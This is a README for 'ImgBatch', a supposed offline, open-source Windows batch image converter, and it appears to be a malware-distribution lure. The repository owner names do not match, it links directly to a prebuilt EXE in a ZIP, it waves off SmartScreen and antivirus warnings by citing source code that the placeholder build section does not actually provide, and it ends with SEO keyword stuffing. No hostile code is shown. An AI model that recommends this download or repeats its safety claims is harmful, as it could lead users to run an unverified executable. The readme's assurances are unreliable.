<div align="center">

# ImgBatch: Batch Image Converter to WebP & AVIF (Resize, Compress, Optimize)

**Drag & drop a folder, get optimized WebP, AVIF, JPEG and PNG images in seconds. Bulk resize, compress and convert images for the web, with retina @2x sizes, without Photoshop and without the command line.**

[![Release](https://img.shields.io/github/v/release/ExaMagpieRetort/imgbatch-batch-image-converter?style=flat-square)](https://github.com/SupervisorExpiate86/imgbatch-batch-image-converter/releases)
[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg?style=flat-square)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows-blue?style=flat-square)](#installation)
[![Stars](https://img.shields.io/github/stars/ExaMagpieRetort/imgbatch-batch-image-converter?style=flat-square)](https://github.com/SupervisorExpiate86/imgbatch-batch-image-converter/stargazers)

[Download](#installation) · [Features](#features) · [How it works](#how-it-works) · [FAQ](#faq) · [Contributing](#contributing)

![ImgBatch screenshot](/screenshot.png)

</div>

---

## Why ImgBatch?

Heavy images are the #1 reason websites load slowly. Converting hundreds of PNG and JPG files to modern formats by hand, one at a time, is boring and error-prone. Online converters upload your files to a server, limit batch size and compress unpredictably.

**ImgBatch** is a portable, offline desktop app that converts, resizes and compresses entire folders of images at once. Your files never leave your computer.

## Features

- **Batch conversion** between **WebP, AVIF, JPEG and PNG**.
- **Drag & drop** files or whole folders (subfolders included).
- **Bulk resize** by width, height, percentage or max dimension, keeping the aspect ratio.
- **Retina / HiDPI export**: generate `@1x`, `@2x`, `@3x` versions in one pass.
- **Quality control** with a live preview of the resulting file size.
- **Responsive sets**: export several widths (e.g. 480 / 768 / 1280 / 1920) for `srcset`.
- **Keeps your folder structure** or exports everything into one folder.
- **Smart naming**: add suffixes, prefixes or size tags, with safe overwrite protection.
- **Optional metadata (EXIF) removal** for smaller files and better privacy.
- **Before / after report**: see how many MB you saved.
- **100% offline**, no uploads, no accounts, no telemetry.
- **Portable**: no installer, no dependencies.
- **Open source (MIT)** and free forever.

## Supported formats

| Input | Output |
|---|---|
| JPG / JPEG | WebP |
| PNG | AVIF |
| WebP | JPEG |
| AVIF | PNG |
| BMP, GIF (first frame), TIFF | |

> Missing a format? [Open an issue](../../issues/new/choose) or send a pull request.

## Installation

1. Go to the [**Releases**](https://github.com/ExaMagpieRetort/imgbatch-batch-image-converter/releases/latest) page.
2. Download `ImgBatch.zip`.
3. Extract the archive and run `ImgBatch.exe`.

Direct link to the latest version:
`https://github.com/SupervisorExpiate86/imgbatch-batch-image-converter/releases/latest/download/ImgBatch.zip`

> **Windows SmartScreen / antivirus warning?** The app is not code-signed yet, so Windows may warn about an unknown publisher. The full source code is in this repository and you can build the app yourself (see [Building from source](#building-from-source)).

## How it works

1. **Drop** your images or a folder into the window.
2. **Choose** the output format, quality and size.
3. **Click Convert.** Optimized files appear in your output folder.

## Typical use cases

- Converting a website's `PNG` / `JPG` assets to **WebP or AVIF** for faster page load and better Core Web Vitals (LCP).
- Preparing **retina (@2x)** images for responsive layouts.
- Shrinking photos for email, CMS uploads, e-commerce catalogs or blogs.
- Bulk resizing designer exports before handing them to development.
- Cleaning up screenshots and removing metadata before sharing.

## Why WebP and AVIF?

| Format | Typical savings vs JPEG | Browser support |
|---|---|---|
| WebP | 25–35% smaller | All modern browsers |
| AVIF | 40–50% smaller | All modern browsers (check your audience) |

Smaller images mean faster pages, lower bandwidth costs and better SEO.

## Building from source

```bash
git clone https://github.com/ExaMagpieRetort/imgbatch-batch-image-converter.git
cd imgbatch-batch-image-converter

# Add your build commands here, for example:
# dotnet publish -c Release -p:PublishSingleFile=true
# pyinstaller --onefile src/main.py
# cargo build --release
```

## FAQ

**Is conversion lossless?**
It depends on your settings. WebP and AVIF support both lossy and lossless modes. PNG output is always lossless.

**Will my original files be changed?**
No. Originals are never modified; results go to a separate output folder.

**Does it support transparency?**
Yes, for PNG, WebP and AVIF. When converting to JPEG, transparency is replaced with a background color you choose.

**How many files can I convert at once?**
There is no hard limit. Speed depends on your CPU and image size.

**Are my images uploaded anywhere?**
No. ImgBatch works fully offline and collects no data.

**Windows only?**
The first release targets Windows. Linux and macOS builds are on the [roadmap](#roadmap).

## Roadmap

- [ ] Linux and macOS builds
- [ ] Command-line mode for scripts and CI
- [ ] Watch folder (auto-convert new files)
- [ ] Presets (web, email, social, print)
- [ ] Watermark support
- [ ] Code signing
- [ ] Multi-language UI

## Contributing

Contributions are welcome! Read [CONTRIBUTING.md](CONTRIBUTING.md), then open an issue or a pull request. If ImgBatch saved you time, a star on the repo helps other developers find it.

## License

[MIT](LICENSE) © ExaMagpieRetort

---

<sub>Keywords: batch image converter, convert images to webp, convert png to webp, convert jpg to avif, bulk image resizer, image compressor, image optimizer, bulk image compression, retina image generator, responsive images srcset, offline image converter, portable exe, Windows image tools.</sub>
